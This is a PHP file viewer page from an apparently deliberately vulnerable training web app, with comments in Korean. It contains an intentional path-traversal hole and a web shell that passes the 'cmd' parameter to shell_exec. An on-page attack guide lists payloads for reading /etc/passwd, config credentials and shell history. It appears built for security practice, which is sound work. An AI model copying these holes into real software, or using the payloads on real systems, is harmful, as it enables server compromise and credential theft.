<?php
// file.php - 파일 뷰어 (LFI 취약)
include 'config.php';
requireLogin();

$error = '';
$file_content = '';
$file_name = '';

if (isset($_GET['name'])) {
    $file_name = $_GET['name'];

    // 중급 보안: 기본적인 필터링 (우회 가능)
    $blocked_patterns = ['../../../', '..\\..\\..\\'];
    $is_blocked = false;

    foreach ($blocked_patterns as $pattern) {
        if (strpos($file_name, $pattern) !== false) {
            $is_blocked = true;
            break;
        }
    }

    // 취약점: ../ 두 번만 차단, null byte 우회 가능
    // 취약점: 절대 경로 사용 가능
    // 취약점: 파일 존재 여부만 확인

    if ($is_blocked) {
        $error = "⚠️ 허용되지 않은 경로입니다.";
    } else {
        // 취약점: UPLOAD_DIR 제한 우회 가능
        $file_path = UPLOAD_DIR . $file_name;

        // ../ 두 번만 사용하면 우회 가능
        // 예: ../../etc/passwd

        if (file_exists($file_path)) {
            $file_content = file_get_contents($file_path);
        } else {
            $error = "❌ 파일을 찾을 수 없습니다.";
        }
    }
}

// CMD 실행 (웹쉘)
$cmd_output = '';
if (isset($_GET['cmd'])) {
    // 취약점: 명령어 실행 가능
    $cmd = $_GET['cmd'];
    $cmd_output = shell_exec($cmd);
}
?>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>파일 뷰어 - Vulnerable SNS</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #fafafa;
            min-height: 100vh;
        }
        .navbar {
            background: white;
            border-bottom: 1px solid #dbdbdb;
            padding: 15px 0;
        }
        .nav-content {
            max-width: 975px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            align-items: center;
            gap: 20px;
        }
        .back-btn {
            color: #262626;
            text-decoration: none;
            font-size: 18px;
        }
        h1 {
            font-size: 20px;
            color: #262626;
        }
        .container {
            max-width: 1000px;
            margin: 40px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 30px;
            margin-bottom: 20px;
        }
        .card h2 {
            margin-bottom: 15px;
            color: #262626;
            font-size: 18px;
        }
        .error {
            background: #fee;
            color: #c33;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #c33;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            color: #856404;
            font-size: 13px;
        }
        .file-content {
            background: #f8f9fa;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            white-space: pre-wrap;
            word-wrap: break-word;
            max-height: 600px;
            overflow-y: auto;
        }
        .info-box {
            background: #e3f2fd;
            border-left: 4px solid #2196f3;
            padding: 15px;
            border-radius: 8px;
            font-size: 13px;
        }
        .info-box code {
            background: white;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            display: block;
            margin: 5px 0;
        }
        .cmd-output {
            background: #1e1e1e;
            color: #00ff00;
            border-radius: 8px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            white-space: pre-wrap;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="nav-content">
            <a href="upload.php" class="back-btn">
                <i class="fas fa-arrow-left"></i>
            </a>
            <h1>파일 뷰어</h1>
        </div>
    </nav>

    <div class="container">
        <div class="warning">
            <strong>⚠️ LFI (Local File Inclusion) 취약점:</strong> 경로 검증 우회 가능<br>
            💡 힌트: <code>../</code> 두 번만 차단됨. 절대 경로 또는 다른 우회 기법 사용 가능
        </div>

        <?php if ($error): ?>
            <div class="error"><?php echo $error; ?></div>
        <?php endif; ?>

        <?php if ($file_name): ?>
        <div class="card">
            <h2><i class="fas fa-file-alt"></i> <?php echo htmlspecialchars($file_name); ?></h2>
            <div class="file-content"><?php echo htmlspecialchars($file_content); ?></div>
        </div>
        <?php endif; ?>

        <?php if ($cmd_output): ?>
        <div class="card">
            <h2><i class="fas fa-terminal"></i> 명령어 실행 결과</h2>
            <div class="cmd-output"><?php echo htmlspecialchars($cmd_output); ?></div>
        </div>
        <?php endif; ?>

        <div class="card">
            <h2><i class="fas fa-exclamation-triangle"></i> LFI 공격 가이드</h2>

            <div class="info-box">
                <strong>LFI 취약점 테스트 예제:</strong><br><br>

                <strong>1. 기본 LFI (차단됨):</strong><br>
                <code>file.php?name=../../../etc/passwd ❌</code><br><br>

                <strong>2. 우회 방법 - ../ 두 번만 사용:</strong><br>
                <code>file.php?name=../../etc/passwd ✅</code><br>
                <code>file.php?name=../../etc/hosts ✅</code><br>
                <code>file.php?name=../config.php ✅</code><br><br>

                <strong>3. 절대 경로 사용:</strong><br>
                <code>file.php?name=/etc/passwd ✅</code><br>
                <code>file.php?name=/var/www/html/config.php ✅</code><br><br>

                <strong>4. 웹쉘 실행 (업로드한 .php5 파일):</strong><br>
                <code>file.php?name=shell.php5&cmd=whoami ✅</code><br>
                <code>file.php?name=shell.php5&cmd=ls -la ✅</code><br>
                <code>file.php?name=shell.php5&cmd=cat /etc/passwd ✅</code><br><br>

                <strong>5. 민감한 파일 읽기:</strong><br>
                <code>file.php?name=../../config.php (DB 정보)</code><br>
                <code>file.php?name=/var/log/apache2/access.log (로그)</code><br>
                <code>file.php?name=/home/ubuntu/.bash_history (명령 기록)</code><br>
            </div>
        </div>
    </div>
</body>
</html>
